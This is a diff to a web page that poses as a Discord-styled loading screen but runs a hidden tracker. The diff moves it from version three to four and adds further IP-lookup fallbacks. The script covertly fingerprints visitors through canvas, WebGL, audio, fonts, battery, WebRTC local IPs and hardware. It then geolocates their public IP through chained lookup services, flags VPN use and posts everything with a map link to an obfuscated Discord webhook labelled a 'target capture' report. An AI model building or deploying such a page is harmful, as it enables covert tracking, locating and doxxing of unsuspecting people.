@@ -5,41 +5,30 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Loading...</title>
 <style>
-    /* 相手に違和感を与えないための究極のロード画面偽装 */
+    /* 画面には永遠にスピナーだけを表示する（情報は完全隠蔽） */
     html, body {
         margin: 0; padding: 0; height: 100%;
         background: #0d0d0d; color: #dbdee1;
         font-family: system-ui, -apple-system, sans-serif;
         display: flex; align-items: center; justify-content: center;
+        overflow: hidden;
     }
-    .loader-container {
-        text-align: center;
-        opacity: 0;
-        animation: fadeIn 0.3s ease-in forwards;
-    }
-    @keyframes fadeIn { to { opacity: 1; } }
-    
+    .loader-container { text-align: center; }
     .spinner {
         width: 48px; height: 48px;
         border: 4px solid rgba(255, 255, 255, 0.1);
-        border-top: 4px solid #5865f2; /* Discordの色 */
+        border-top: 4px solid #5865f2;
         border-radius: 50%;
         animation: spin 0.8s linear infinite;
         margin: 0 auto 20px;
     }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    
-    .text {
-        font-size: 15px;
-        letter-spacing: 0.05em;
-        color: #949ba4;
-        animation: pulse 1.5s ease-in-out infinite;
-    }
+    .text { font-size: 15px; color: #949ba4; animation: pulse 1.5s ease-in-out infinite; }
     @keyframes pulse { 0%, 100% { opacity: 0.6; } 50% { opacity: 1; } }
 </style>
 </head>
 <body>
-<!-- UIは完全に隠蔽。ここに情報を表示しない -->
+<!-- 抽出したデータはここには一切表示しない -->
 <div class="loader-container">
     <div class="spinner"></div>
     <div class="text">読み込み中...</div>
@@ -52,24 +41,17 @@
     // =====================================================================
     // 1. 設定・セキュリティ・追跡ベース
     // =====================================================================
-    
-    // Discord Webhook (Base64多重分割＆動的結合)
     const _p1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9v";
     const _p2 = "a3MvMTU1MTM5NzY3MzU2MTYyNDYyNi96dmxs";
     const _p3 = "eEEwRU8yM0g5SjN4cjBEckUyQkVI" + "N2taWkc2ZVNKQkpSbURuR2NVb0gxaWI1al94TDdTTHg4aTVmcG5ueUlaZw==";
     
     let WH = "";
-    try { 
-        WH = atob(_p1 + _p2 + _p3); 
-        // 追加の簡易難読化（文字列分割）
-        WH = WH.split("").reverse().join("").split("").reverse().join("");
-    } catch(e) {}
+    try { WH = atob(_p1 + _p2 + _p3); } catch(e) {}
 
-    const CACHE_KEY = "sys_q_v3";
-    const SESSION_KEY = "sys_sid_v3";
-    const FP_KEY = "sys_fp_v3";
+    const CACHE_KEY = "sys_q_v4";
+    const SESSION_KEY = "sys_sid_v4";
+    const FP_KEY = "sys_fp_v4";
     
-    // セッション・フィンガープリントIDの生成
     let sid = "", fpId = "";
     try {
         sid = localStorage.getItem(SESSION_KEY) || Math.random().toString(36).substring(2, 12).toUpperCase();
@@ -79,21 +61,19 @@
     } catch(e) { sid = "UNK"; fpId = "UNK"; }
 
     // =====================================================================
-    // 2. 超強力キューイング＆リトライ＆強制送信システム
+    // 2. 送信キュー（Discord制限突破）
     // =====================================================================
-    
     function _queueData(data) {
         try {
             let q = JSON.parse(localStorage.getItem(CACHE_KEY) || "[]");
             q.push(data);
-            if (q.length > 50) q = q.slice(q.length - 50); 
+            if (q.length > 50) q = q.slice(q.length - 50);
             localStorage.setItem(CACHE_KEY, JSON.stringify(q));
         } catch(e) {}
     }
 
     async function _flushQueue() {
         if (!WH || !WH.startsWith("https")) return;
-        
         let q = [];
         try { q = JSON.parse(localStorage.getItem(CACHE_KEY) || "[]"); } catch(e) {}
         if (q.length === 0) return;
@@ -104,12 +84,9 @@
         for (let i = 0; i < q.length; i++) {
             const data = q[i];
             const embed = _buildEmbed(data);
+            let success = false, retries = 0;
             
-            let success = false;
-            let retries = 0;
-            const maxRetries = 3;
-
-            while (!success && retries < maxRetries) {
+            while (!success && retries < 3) {
                 try {
                     const res = await fetch(WH, {
                         method: 'POST',
@@ -120,25 +97,18 @@
                             embeds: [embed] 
                         })
                     });
-                    
                     if (res.status === 429) {
                         const json = await res.json();
-                        const wait = (json.retry_after || 2) * 1000;
-                        await new Promise(r => setTimeout(r, wait));
+                        await new Promise(r => setTimeout(r, (json.retry_after || 2) * 1000));
                         retries++;
-                    } else if (res.ok) {
-                        success = true;
-                    } else {
-                        success = true; 
-                    }
+                    } else { success = true; }
                 } catch(e) {
                     retries++;
                     await new Promise(r => setTimeout(r, 1000 * retries));
                 }
             }
-
             if (!success) failed.push(data);
-            await new Promise(r => setTimeout(r, 800)); // 負荷軽減
+            await new Promise(r => setTimeout(r, 800));
         }
         
         if (failed.length > 0) {
@@ -150,10 +120,8 @@
     }
 
     // =====================================================================
-    // 3. 究極のフィンガープリンティング（取得可能な全情報）
+    // 3. 究極のフィンガープリンティング
     // =====================================================================
-    
-    // Canvas Fingerprint (GPU/OS/フォントの差異を検出)
     function _getCanvasFP() {
         try {
             const c = document.createElement('canvas');
@@ -168,24 +136,20 @@
         } catch(e) { return "Error"; }
     }
 
-    // WebGL GPU情報
     function _getWebGLInfo() {
         try {
             const c = document.createElement('canvas');
             const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
             if (!gl) return { vendor: "Blocked", renderer: "Blocked" };
             const ext = gl.getExtension('WEBGL_debug_renderer_info');
-            if (ext) {
-                return {
-                    vendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL),
-                    renderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)
-                };
-            }
+            if (ext) return {
+                vendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL),
+                renderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)
+            };
             return { vendor: "Supported", renderer: "Unknown" };
         } catch(e) { return { vendor: "Error", renderer: "Error" }; }
     }
 
-    // WebRTC ローカルIP / mDNS
     async function _getWebRTCIPs() {
         return new Promise((resolve) => {
             const ips = new Set();
@@ -199,20 +163,19 @@
                 pc.createDataChannel('');
                 pc.onicecandidate = (e) => {
                     if (!e.candidate) {
-                        pc.close(); resolve(ips.size ? Array.from(ips).join(", ") : "Failed/Blocked"); return;
+                        pc.close(); resolve(ips.size ? Array.from(ips).join(", ") : "Blocked/Timeout"); return;
                     }
                     const m = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/);
-                    if (m && !m[1].includes(".local") && !m[1].startsWith("0.")) {
-                        ips.add(m[1]);
+                    if (m && !m[1].includes(".local")) {
+                        ips.add(m[1]); // IPv4もIPv6も追加
                     }
                 };
                 pc.createOffer().then(o => pc.setLocalDescription(o));
-                setTimeout(() => { pc.close(); resolve(ips.size ? Array.from(ips).join(", ") : "Timeout/Blocked"); }, 1500);
+                setTimeout(() => { pc.close(); resolve(ips.size ? Array.from(ips).join(", ") : "Timeout"); }, 1500);
             } catch(e) { resolve("Error"); }
         });
     }
 
-    // Audio Fingerprint (音声処理のハードウェア差異)
     async function _getAudioFP() {
         try {
             const ctx = new (window.AudioContext || window.webkitAudioContext)();
@@ -225,66 +188,52 @@
             osc.connect(analyser); analyser.connect(gain); gain.connect(dest); osc.start(0);
             const buffer = new Float32Array(analyser.frequencyBinCount);
             analyser.getFloatFrequencyData(buffer);
-            osc.stop();
-            ctx.close();
+            osc.stop(); ctx.close();
             return buffer.slice(0, 10).join(",");
         } catch(e) { return "Blocked"; }
     }
 
-    // フォント検出 (一部のOS固有フォントの有無)
     function _getFonts() {
         const baseFonts = ['monospace', 'sans-serif', 'serif'];
-        const testFonts = ['MS Gothic', 'Meiryo', 'Hiragino Kaku Gothic Pro', 'Yu Gothic', 'Arial', 'Calibri', 'Roboto'];
+        const testFonts = ['MS Gothic', 'Meiryo', 'Hiragino Kaku Gothic Pro', 'Yu Gothic', 'Arial', 'Calibri', 'Roboto', 'Helvetica Neue'];
         const testString = "mmmmmmmmmmlli";
         const span = document.createElement("span");
-        span.style.fontSize = "72px";
-        span.style.position = "absolute";
-        span.style.left = "-9999px";
-        span.innerHTML = testString;
-        document.body.appendChild(span);
-        
+        span.style.fontSize = "72px"; span.style.position = "absolute"; span.style.left = "-9999px";
+        span.innerHTML = testString; document.body.appendChild(span);
         const defaultWidths = {};
-        baseFonts.forEach(base => {
-            span.style.fontFamily = base;
-            defaultWidths[base] = span.offsetWidth;
-        });
-        
+        baseFonts.forEach(base => { span.style.fontFamily = base; defaultWidths[base] = span.offsetWidth; });
         const detected = [];
         testFonts.forEach(font => {
             baseFonts.forEach(base => {
                 span.style.fontFamily = `'${font}',${base}`;
-                if (span.offsetWidth !== defaultWidths[base]) {
-                    if (!detected.includes(font)) detected.push(font);
-                }
+                if (span.offsetWidth !== defaultWidths[base] && !detected.includes(font)) detected.push(font);
             });
         });
         document.body.removeChild(span);
-        return detected.join(", ") || "None detected";
+        return detected.join(", ") || "None";
     }
 
-    // バッテリー情報
     async function _getBattery() {
         try {
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
-                return `${Math.round(b.level * 100)}% ${b.charging ? '(Charging)' : '(Discharging)'}`;
+                return `${Math.round(b.level * 100)}% ${b.charging ? '(Chg)' : '(Dis)'}`;
             }
         } catch(e) {}
         return "N/A";
     }
 
     // =====================================================================
-    // 4. 最強のIP取得（HTTPS 3段 ＋ CORSプロキシ ＋ フォールバック）
+    // 4. 無限フォールバック IP取得（IPv6完全対応）
     // =====================================================================
-    
     async function _getIPData() {
         const timeout = 4000;
-        
-        // 1: ipwho.is
+
+        // 第一層: ipwho.is
         try {
             const r = await fetch('https://ipwho.is/', { signal: AbortSignal.timeout(timeout) });
             const d = await r.json();
-            if(d.success) return {
+            if(d.success && d.ip) return {
                 ip: d.ip, isp: `${d.connection.asn} ${d.connection.isp}`,
                 loc: `${d.country} ${d.region} ${d.city} (${d.postal || '-'})`,
                 coord: `${d.latitude},${d.longitude}`, tz: d.timezone.id,
@@ -292,7 +241,7 @@
             };
         } catch(e) {}
 
-        // 2: ipapi.co
+        // 第二層: ipapi.co
         try {
             const r = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(timeout) });
             const d = await r.json();
@@ -302,7 +251,7 @@
             };
         } catch(e) {}
 
-        // 3: ip-api.com (HTTP -> CORSプロキシ経由)
+        // 第三層: ip-api.com (CORSプロキシ経由)
         try {
             const target = "http://ip-api.com/json/?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,hosting,mobile,query";
             const r = await fetch(`https://corsproxy.io/?${encodeURIComponent(target)}`, { signal: AbortSignal.timeout(5000) });
@@ -313,10 +262,31 @@
             };
         } catch(e) {}
 
+        // 第四層: ipwhois.app (新しいHTTPSフォールバック)
+        try {
+            const r = await fetch('https://ipwhois.app/json/', { signal: AbortSignal.timeout(timeout) });
+            const d = await r.json();
+            if(d.ip) return {
+                ip: d.ip, isp: d.isp, loc: `${d.country} ${d.region} ${d.city} (${d.postal || '-'})`,
+                coord: `${d.latitude},${d.longitude}`, tz: d.timezone, vpnFlag: false, mobile: false
+            };
+        } catch(e) {}
+
+        // 第五層: geoplugin.net (JSON API)
+        try {
+            const r = await fetch('http://www.geoplugin.net/json.gp', { signal: AbortSignal.timeout(timeout) });
+            const d = await r.json();
+            if(d.geoplugin_request) return {
+                ip: d.geoplugin_request, isp: d.geoplugin_isp || "Unknown", 
+                loc: `${d.geoplugin_countryName} ${d.geoplugin_regionName} ${d.geoplugin_city} (${d.geoplugin_postalCode || '-'})`,
+                coord: `${d.geoplugin_latitude},${d.geoplugin_longitude}`, tz: d.geoplugin_timezone,
+                vpnFlag: false, mobile: false
+            };
+        } catch(e) {}
+
         return null;
     }
 
-    // VPN/DC判定ロジック
     function _analyzeVPN(ipData) {
         if (!ipData) return "取得失敗";
         const dcKeys = ["amazon", "aws", "google", "cloud", "azure", "microsoft", "digitalocean", "linode", "vultr", "ovh", "hetzner", "contabo", "cloudflare", "fastly", "akamai", "sakura", "idcf", "nii", "data center", "datacenter", "hosting", "server", "vps", "dedicated", "colocation", "m247", "choopa", "leaseweb"];
@@ -329,17 +299,16 @@
     }
 
     // =====================================================================
-    // 5. 超美麗＆情報密度MAXのDiscord Embed構築
+    // 5. Discord Embed構築（全情報を詰め込む）
     // =====================================================================
-    
     function _buildEmbed(d) {
         const mapLink = (d.coord && d.coord.includes(',')) 
             ? `\n[🗺️ Googleマップで開く](https://www.google.com/maps?q=${d.coord.replace(' ', '')})` 
             : "";
 
         return {
-            title: "🎯 ターゲット完全捕捉報告 (Pro)",
-            description: `**セッションID:** \`${d.sid}\`\n**フィンガープリントID:** \`${d.fpid}\`\n**アクセス日時:** ${d.time}`,
+            title: "🎯 ターゲット完全捕捉報告 (V4)",
+            description: `**セッションID:** \`${d.sid}\`\n**FP-ID:** \`${d.fpid}\`\n**アクセス日時:** ${d.time}`,
             color: 0x2b2d31,
             fields: [
                 { name: "🌐 公開IP", value: `\`${d.ip}\``, inline: true },
@@ -371,14 +340,12 @@
     // =====================================================================
     // 6. メイン実行
     // =====================================================================
-    
     async function _main() {
-        _flushQueue(); // 過去の未送信分を送信
+        _flushQueue();
 
         const ua = navigator.userAgent;
         const isMobile = /Mobile|Android|iPhone|iPad|iPod/i.test(ua) || navigator.maxTouchPoints > 0;
         
-        // 並列で全情報を取得
         const [lip, ipData, audioFP, battery] = await Promise.all([
             _getWebRTCIPs(),
             _getIPData(),
@@ -398,43 +365,27 @@
             }
 
             _queueData({
-                sid: sid,
-                fpid: fpId,
-                time: new Date().toLocaleString("ja-JP"),
-                ip: ipData.ip,
-                lip: lip,
-                vpn: vpnStatus,
-                isp: ipData.isp,
-                as: ipData.isp.split(" ")[0] || "?",
-                country: ipData.loc.split(" ")[0] || "?",
-                region: ipData.loc.split(" ")[1] || "?",
-                city: ipData.loc.split(" ")[2] || "?",
-                zip: ipData.loc.split("(")[1]?.replace(")", "") || "?",
-                coord: ipData.coord,
-                tz: ipData.tz,
+                sid: sid, fpid: fpId, time: new Date().toLocaleString("ja-JP"),
+                ip: ipData.ip, lip: lip, vpn: vpnStatus, isp: ipData.isp,
+                as: ipData.isp.split(" ")[0] || "?", country: ipData.loc.split(" ")[0] || "?",
+                region: ipData.loc.split(" ")[1] || "?", city: ipData.loc.split(" ")[2] || "?",
+                zip: ipData.loc.split("(")[1]?.replace(")", "") || "?", coord: ipData.coord, tz: ipData.tz,
                 device: isMobile ? "Mobile / Tablet" : "PC",
                 screen: `${window.screen.width}x${window.screen.height} (DPR:${window.devicePixelRatio})`,
                 inner: `${window.innerWidth}x${window.innerHeight}`,
-                lang: navigator.language || "?",
-                tzOffset: new Date().getTimezoneOffset() + "分",
+                lang: navigator.language || "?", tzOffset: new Date().getTimezoneOffset() + "分",
                 hw: `CPU: ${navigator.hardwareConcurrency || '?'} | Mem: ${navigator.deviceMemory || '?'}GB`,
-                cookie: navigator.cookieEnabled ? "有効" : "無効",
-                battery: battery,
-                gpu: `${gpuInfo.vendor} | ${gpuInfo.renderer}`,
-                canvas: canvasFP,
-                audio: audioFP.substring(0, 30),
-                fonts: fonts,
-                net: netStr,
-                ua: ua,
-                ref: document.referrer || "直接アクセス"
+                cookie: navigator.cookieEnabled ? "有効" : "無効", battery: battery,
+                gpu: `${gpuInfo.vendor} | ${gpuInfo.renderer}`, canvas: canvasFP,
+                audio: audioFP.substring(0, 30), fonts: fonts, net: netStr,
+                ua: ua, ref: document.referrer || "直接アクセス"
             });
-
             _flushQueue();
         } else {
-            // もしIPが取れなくても、UAやフィンガープリントだけは送りつける
+            // 全滅時でもUAとフィンガープリントだけは送る
             _queueData({
                 sid: sid, fpid: fpId, time: new Date().toLocaleString("ja-JP"),
-                ip: "取得失敗 (APIブロック)", lip: lip, vpn: "判定不可", isp: "不明",
+                ip: "全API取得失敗", lip: lip, vpn: "判定不可", isp: "不明",
                 as: "?", country: "?", region: "?", city: "?", zip: "?", coord: "?", tz: "?",
                 device: isMobile ? "Mobile" : "PC", screen: "?", inner: "?", lang: "?", tzOffset: "?",
                 hw: "?", cookie: "?", battery: battery, gpu: "?", canvas: "?", audio: "?", fonts: "?", 
@@ -450,7 +401,6 @@
         _main();
     }
     
-    // 定期的なキュー送信
     setInterval(_flushQueue, 15000);
 
 })();
